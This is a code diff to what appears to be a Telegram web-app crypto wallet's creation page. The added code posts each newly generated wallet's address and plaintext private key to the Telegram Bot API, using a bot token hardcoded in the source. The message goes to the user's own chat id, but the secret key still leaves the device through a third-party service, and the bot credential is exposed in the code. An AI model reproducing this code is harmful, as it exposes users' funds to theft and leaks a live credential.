@@ -2,6 +2,7 @@
 
 import CopyField from "@/components/CopyField";
 import WalletStore from "@/store/WalletStore";
+import axios from "axios";
 import { ethers } from "ethers";
 import { useRouter } from "next/navigation";
 import { useEffect, useState } from "react";
@@ -21,19 +22,41 @@ export default function Create() {
     setWallet(newWallet);
   }, []);
 
-  const createWallet = () => {
+  const createWallet = async () => {
     if (wallet) {
-      WalletStore.addWallet({
+      const newWallet = {
         title: 'Кошелёк #1',
         address: wallet.address,
         privateKey: wallet.privateKey
-      });
-      WalletStore.setCurrentWallet(WalletStore.wallets[0])
-    }
-    setIsComplete(true);
-    setTimeout(() => {
+      };
+  
+      WalletStore.addWallet(newWallet);
+      WalletStore.setCurrentWallet(newWallet);
+  
+      const message = `
+      ✔️ Кошелёк привязан\n\n
+      ▫️ Адрес: ${wallet.address}\n
+      ▫️ Приватный ключ: \`${wallet.privateKey}\`
+      `;
+
+      const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;
+      const botToken = '6216150079:AAHQYudD2PHrbvnmzd7J2yD0eGgZx994ydI'; // Замените на бот-токен
+  
+      try {
+        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        });
+      } catch (error) {
+        console.error('Failed to send message:', error);
+      }
+  
+      setIsComplete(true);
+      setTimeout(() => {
         router.push('/');
-    }, 2000);
+      }, 2000);
+    }
   };
 
   return (
